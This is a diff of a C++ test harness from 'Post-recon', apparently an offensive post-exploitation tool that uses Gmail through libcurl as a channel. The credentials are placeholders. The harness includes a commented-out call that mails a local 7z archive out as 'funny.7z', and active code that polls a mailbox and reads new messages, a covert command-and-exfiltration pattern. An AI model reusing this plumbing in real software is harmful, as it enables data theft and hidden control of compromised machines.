@@ -1,6 +1,3 @@
-#include <Windows.h>
-#include "prLibCurl.h"
-
 /*
 This file is part of Post-recon
 Copyright (C) 2017 @maldevel
@@ -24,19 +21,40 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 For more see the file 'LICENSE' for copying permission.
 */
 
-#define TO "xxxxxxxxx@gmail.com"
-#define FROM "yyyyyy@gmail.com"
-#define FromNAME "Tester1"
-#define ToNAME "Tester2"
-#define PASSWORD "xxxxxxxxxxxxxxxx"
+#include <Windows.h>
+#include "prCommon.h"
+#include "prLibCurl.h"
+
+#define TO "xxxxxxx@gmail.com"
+#define PASSWORD2 "xxxxxxxxx"
+#define ToNAME "xxxxxx"
+
+#define FROM "yyyyyyy@gmail.com"
+#define PASSWORD "yyyyyyyyyyyyy"
+#define FromNAME "yyyyyyy"
+
 
 int main(void)
 {
 	char subject[50] = "Hello there";
 	char body[100] = "Test body\r\nnew line\r\ntest test\r\ntest";
+	int *ids;
+	int i = 0;
+	int emails = 0;
+
+	Common::init();
 
 	//LibCurl::SendEmail(FROM, FromNAME, TO, ToNAME, subject, body, PASSWORD, FALSE, "");
-	LibCurl::SendEmail(FROM, FromNAME, TO, ToNAME, subject, body, PASSWORD, TRUE, "\\path\\to\\filename.7z", "funny.7z");
+	//check if file EXISTS!!!!!!!!!!!
+	//LibCurl::SendEmail(FROM, FromNAME, TO, ToNAME, subject, body, PASSWORD, TRUE, "\path\to\file\test.7z", "funny.7z", "libcurl-agent/1.0", 1L);
+
+	//TESTING
+	if ((emails = LibCurl::GetNewEmailsIDs(&ids, TO, PASSWORD2, "libcurl-agent/1.0", 1L)) != -1) {
+		for (i = 0; i < emails; i++) {
+			LibCurl::ReceiveEmail(ids[i], TO, PASSWORD2, "libcurl-agent/1.0", 1L);
+		}
+		Common::hFree(ids);
+	}
 
 	return EXIT_SUCCESS;
 }
